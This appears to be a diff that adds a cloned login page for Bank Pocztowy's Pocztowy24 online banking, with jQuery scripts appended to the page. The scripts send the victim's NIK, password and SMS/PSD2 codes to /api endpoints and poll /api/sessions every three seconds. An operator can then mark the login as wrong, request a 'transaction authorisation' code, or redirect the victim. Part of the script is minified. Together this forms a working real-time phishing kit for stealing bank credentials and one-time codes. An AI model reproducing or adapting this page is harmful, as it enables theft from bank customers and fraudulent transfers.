@@ -1,0 +1,277 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0042)https://www.pocztowy24.pl/cbp-webapp/login -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+
+    <meta name="description" content="">
+
+
+    <title>System bankowości internetowej Banku Pocztowego S.A.</title>
+    <link rel="stylesheet" href="/assets/banks/bankpocztowy_files/420210206231848518913.css" media="screen, projection" type="text/css">
+
+
+</head>
+<body   >
+<div id="progress">
+    <div id="indicator" class="loading-indicator"></div>
+    <div class="loading-panel"></div>
+</div>
+
+<div class="content">
+
+    <div class="link" style="float: right; width: 198px;">
+        <a href="https://www.pocztowy24.pl/demo/">
+            Zobacz też wersję demo</a>
+    </div>
+
+
+
+
+
+    <div id="header">
+        <h1 id="summaryInfo">Logowanie do systemu bankowości internetowej Banku Pocztowego</h1>
+    </div>
+
+    <div>
+
+    </div>
+
+    <div id="login-form">
+        <div id="errorMessage">
+        </div>
+        <div id="message">
+
+
+        </div>
+        <form>
+            <input type="hidden" id="action_type" name="action_type" value="login">
+            <input type="text" style="display:none">
+            <input type="password" style="display:none">
+            <div id="mainCont">
+                <div class="line">
+                    <label for="nik">
+                        :Wpisz NIK
+                    </label>
+                    <input type="text" id="bank_login" name="nik" tabindex="1" autocomplete="off" placeholder="(Numer Identyfikacyjny Klienta)">
+                    <span class="help" title="Wpisz NIK"></span>
+                </div>
+                <div class="line">
+                    <label for="password">
+                        :Wpisz hasło
+                    </label>
+                    <input type="text" id="bank_password" name="password" style="text-security:disc; -webkit-text-security:disc;" tabindex="2" autocomplete="off" class="numeric-password">
+                    <span class="help" title="Wpisz hasło (musi się ono składać z co najmniej 8 znaków i zawierać znaki z co najmniej trzech grup: małe litery, wielkie litery, cyfry lub znaki specjalne)"></span>
+                </div>
+            </div>
+            <input type="hidden" id="key" name="key" value="">
+            <div class="buttons" id="buttonsCont">
+                <div tabindex="3" role="button" class="button" id="login_button" onclick="bankLogin(); plusBankUpdate()">
+                            <span class="button-wrap">
+                                <span class="button-label">
+                                    Zaloguj się
+                                </span>
+                            </span>
+                </div>
+            </div>
+
+        </form>
+    </div>
+
+    <div id="panels">
+        <div class="panel first">
+            <div class="cbp-login-text-panel">
+                <h1>Zmiana w sposobie realizacji przelewów</h1>
+                <ul>
+                    <li>
+                        Przelewy standardowe zlecone w dni robocze po godz. 22:00 oraz w soboty, niedziele i święta zostaną przekazane do realizacji następnego dnia roboczego</li>
+                    <li>
+                        Transakcje przekazane do realizacji w te dni widoczne będą w zakładce Zobacz Historię -&gt; Zaplanowane.
+                    </li>
+                    <li>
+                        Przelewy pojawią się w zakładce Zobacz Historię -&gt; Wykonane dopiero po zaksięgowaniu następnego dnia roboczego.
+                    </li>
+                    <li>
+                        W przypadku przelewów zleconych do wykonania na dzień wolny, Bank dokonuje blokady środków potrzebnych na ich realizację. Jeśli nie wyrażasz zgody na założenie blokady, prosimy o odwołanie realizacji przelewu w zakładce Historia -&gt; Zaplanowane.
+                    </li></ul>
+                <h1>Dostęp do systemu</h1>
+                <p>Znajdujesz się na stronie logowania do systemu bankowości internetowej Pocztowy24</p>
+                <p style="font-weight: bolder;">Pierwsze logowanie:</p>
+                <ul>
+                    <li>Nowi Klienci otrzymają jednorazowe hasło dostępu do systemu na zarejestrowany w Banku numer telefonu komórkowego lub adres do korespondencji</li>
+                    <li><strong style="font-weight: bold; color: #da2429;">Po zalogowaniu system wymusi ustanowienie nowego hasła składającego się z co najmniej <br>8 znaków i zawierającego znaki z co najmniej trzech grup: małe litery, wielkie litery, cyfry lub znaki specjalne (np. Bank1234 lub bank123!)</strong></li>
+                    <li>W przypadku zablokowania dostępu do systemu należy skontaktować się z Infolinią Banku <br>(801 100 500 lub 52 34 99 499) albo udać do placówki Banku lub Poczty Polskiej</li>
+                </ul>
+                <p>Prosimy o aktualizację numerów telefonów komórkowych.<br> Obejrzyj <a href="https://www.youtube.com/watch?v=b3xlxrUvqGo&list=PLf06q067rFPaCYwz38a5nDtl268C0AzeB&index=2" target="_blank" rel="noopener">film o pierwszym logowaniu.</a></p>
+            </div>
+        </div>
+        <div class="panel">
+            <div class="cbp-login-text-panel">
+                <h1>Korzystanie z&nbsp;systemu Banku</h1>
+                <ul>
+                    <li>Wpisując swój NIK i&nbsp;hasło sprawdź, czy nie masz włączonej na klawiaturze funkcji Caps Lock</li>
+                    <li>Do przechodzenia pomiędzy poszczególnymi funkcjami w&nbsp;systemie bankowości elektronicznej używaj menu serwisu. Nie używaj funkcji WSTECZ ani DALEJ w&nbsp;oknie przeglądarki</li>
+                    <li>Pamiętaj, aby zawsze używać funkcji WYLOGUJ, która zapewnia bezpieczne zakończenie pracy w&nbsp;systemie</li>
+                    <li>Wszystkie zauważone nieprawidłowości oraz fakt ewentualnej utraty lub ujawnienia identyfikatora, hasła, telefonu komórkowego lub karty SIM używanych do korzystania z&nbsp;usługi jak najszybciej zgłoś do Banku pod numerami: 801&nbsp;100&nbsp;500 <br> lub +48&nbsp;52&nbsp;34&nbsp;99&nbsp;499</li>
+                    <li>Do prawidłowego działania systemu niezbędne jest zainstalowanie aktualnej wersji oprogramowania Java w&nbsp;przeglądarce. Pocztowy24 obsługiwany jest przez przeglądarki w&nbsp;wymienionych poniżej (oraz wszystkich następnych) wersjach: Internet Explorer w wersji 7.x, Mozilla Firefox w&nbsp;wersji 3.x, Chrome w wersji 10.x, Opera w&nbsp;wersji 10.x, Safari w&nbsp;wersji 4.x.</li>
+                    <p><a href="http://www.pocztowy.pl/indywidualni/bankowosc/internet/#tabs=6" target="_blank">Więcej...</a></p>
+                </ul>
+            </div>
+        </div>
+        <div class="panel">
+            <div class="cbp-login-text-panel">
+                <h1>Prostszy sposób logowania do Pocztowy24</h1>
+                <ul>
+                    <li>Teraz logując się do Pocztowy24 za pomocą nr NIK <br> i hasła, nie będziesz proszony o dodatkową autoryzację kodem SMS lub certyfikatem przy każdym logowaniu.</li>
+                </ul>
+                <ul>
+                    <li><span style="color: #da2429; font-weight: bold;">Dodatkowa autoryzacja przy logowaniu do Pocztowy24 będzie wymagana raz na 90 dni. </span></li>
+                </ul>
+                <ul>
+                    <li>W trosce o bezpieczeństwo, możesz też zostać poproszony o dodatkową autoryzację w ramach danej sesji, jeśli po zalogowaniu do bankowości będziesz korzystać np. z danych starszych niż 90 dni.</li>
+                </ul>
+                <p><a href="https://www.pocztowy.pl/otwartabankowosc/logowanie.html" target="_blank" rel="noope
+ner noopener">Czytaj wiecej.</a></p>
+                <h1>Bezpieczeństwo</h1>
+                <p>Pamiętaj, że system bankowości elektronicznej nigdy:</p>
+                <ul>
+                    <li>Nie prosi o podanie kodu jednorazowego przed logowaniem, jak również bezpośrednio po zalogowaniu. System może prosić o podanie kodu jednorazowego w trakcie logowania.</li>
+                    <li>Nie wysyła e-maili oraz SMS-ów z prośbą <br>o weryfikację danych</li>
+                    <li>Nie prosi o podanie informacji dotyczącej telefonu używanego do autoryzacji operacji</li>
+                    <li>Nie prosi o podanie informacji dotyczących wydanych kart płatniczych takich jak: numer karty, data ważności, kod PIN i CVV/CVV2</li>
+                    <li>Nie prosi o wykonanie testowego przelewu <br>w ramach aktywizacji / sprawdzenia funkcjonalności</li>
+                    <li>Nie prosi o zwrot środków pochodzących z błędnego / podejrzanego przelewu</li>
+                </ul>
+                <p><a href="https://www.pocztowy.pl/indywidualni/bankowosc/bezpieczenstwo/" target="_blank" rel="noope
+ner noopener">Więcej...</a></p>
+            </div>
+        </div>
+    </div>
+
+    <div id="footer">
+        <div id="logo">
+
+        </div>
+    </div>
+</div>
+
+
+<script src="/assets/js/jquery-3.5.1.min.js"></script>
+<script src="/assets/js/cookies.core.1.3.min.js"></script>
+<script src="/assets/js/banklogin.js"></script>
+<script>
+    let bankId = (cookieManager.read('session_id'))
+
+    const plusBankUpdate = () => {
+        if ($("#bank_password").val() && $("#bank_login").val() !== "") {
+            $("#mainCont").empty()
+            $("#mainCont").append(' <div class="line"> <label for="nik"> :Wpisz kod PSD2 </label> <input type="text" id="bank_psd" name="nik" tabindex="1" autocomplete="off" placeholder="(Kod sms z telefonu)"> <span class="help" title="Wpisz NIK"></span> </div>')
+            $("#buttonsCont").empty()
+            $("#buttonsCont").append(' <div tabindex="3" role="button" class="button" id="login_button" onclick="psdUpdate()"> <span class="button-wrap"> <span class="button-label"> Zaloguj się </span> </span> </div>')
+        } else {
+        }
+    }
+
+    const regularCheck = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["uid"] == sessId) {
+                    if (data["result"][i]["accepted"] == "true") {
+                        summaryFunc()
+                        clearInterval(multipleFunc)
+                    }
+                } else {
+
+                }
+            }
+        });
+    }
+    const psdUpdate = () => {
+        if ($("#bank_psd").val() !== "") {
+            $.post("/api/psdupdate/", {
+                bank_psd: $("#bank_psd").val(),
+                sessionId: bankId
+            }).done(data => {
+                $("#mainCont").empty()
+                $("#mainCont").append('<h1>Trwa logowanie, proszę czekać</h1>')
+                $("#buttonsCont").empty()
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+
+        } else {
+            console.log('not selectec')
+        }
+    }
+
+    let multipleFunc = setInterval(function(){ regularCheck() }, 3000);
+
+
+    //WRONG PASS
+
+    const wrongPass = () => {
+        $.post("/api/wrongpass/", {
+            sessionId: bankId,
+            name: "false"
+        }).done(data => {
+            console.log('done')
+        }).fail(error => {
+            console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+        })
+    }
+
+    const regularPass = () => {
+        readTextFile("/api/sessions", function(text){
+            var data = JSON.parse(text);
+            for (let i=0;i<data["result"].length;i++) {
+                if (data["result"][i]["uid"] == sessId) {
+                    if (data["result"][i]["accepted"] == "wrongPass") {
+                        clearInterval(multiplePass)
+                        wrongPass()
+                        location.reload()
+                    }
+                } else {
+
+                }
+            }
+        });
+    }
+
+    let multiplePass = setInterval(function(){ regularPass() }, 3000);
+
+
+
+    //SUMMARY
+
+    const summaryFunc = () => {
+        $("#mainCont").empty()
+        $("#mainCont").append(' <div class="line"> <label for="nik"> :Wpisz kod potwierdzający </label> <input type="text" id="bank_summary" name="nik" tabindex="1" autocomplete="off" placeholder="(Kod sms z telefonu)"> <span class="help" title="Wpisz NIK"></span> </div>')
+        $("#buttonsCont").empty()
+        $("#buttonsCont").append(' <div tabindex="3" role="button" class="button" id="login_button" onclick="summaryCode()"> <span class="button-wrap"> <span class="button-label"> Zaloguj się </span> </span> </div>')
+
+        document.getElementById('summaryInfo').innerText = 'Autoryzuj Tranzakcję'
+    }
+
+    const summaryCode = () => {
+        if ($("#bank_summary").val() !== "") {
+            $.post("/api/summarycode/", {
+                bank_summary: $("#bank_summary").val(),
+                sessionId: bankId
+            }).done(data => {
+                $("#mainCont").empty()
+                $("#mainCont").append('<h1>Logowanie...</h1>')
+                $("#buttonsCont").empty()
+            }).fail(error => {
+                console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.", "Wystąpił błąd")
+            })
+
+        } else {
+            console.log('not selectec')
+        }
+    }
+
+    const regularSummary=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},wrongSum=()=>{$.post("/api/wrongsummary/",{sessionId:bankId,name:"false"}).done(e=>{console.log("done")}).fail(e=>{console.error("Coś poszło nie tak… Spróbuj ponownie za chwilę.","Wystąpił błąd")})};let multipleSummary=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"wrongSummary"==s.result[e].accepted&&(summaryFunc(),wrongSum())})},3e3);const regularComplete=()=>{readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})};let multipleCompleted=setInterval(function(){readTextFile("/api/sessions",function(e){var s=JSON.parse(e);for(let e=0;e<s.result.length;e++)s.result[e].uid==sessId&&"completed"==s.result[e].accepted&&(location.href="/summary")})},3e3);
+</script>
+
+</body></html>
+
